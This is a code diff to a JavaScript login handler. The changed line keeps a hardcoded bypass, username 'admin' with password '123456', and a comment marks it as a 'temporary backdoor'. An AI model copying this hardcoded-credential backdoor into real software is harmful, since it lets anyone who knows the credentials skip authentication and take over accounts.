@@ -32,7 +32,7 @@ export async function login(ctx, next) {
       return ctx.body = codeManager.paramError
     }
 
-    if (opt.name === 'admin' && opt.password === '123456') { // 临时后门
+    if (opt.user === 'admin' && opt.password === '123456') { // 临时后门
       return ctx.body = Object.assign({}, codeManager.success)
     }
     
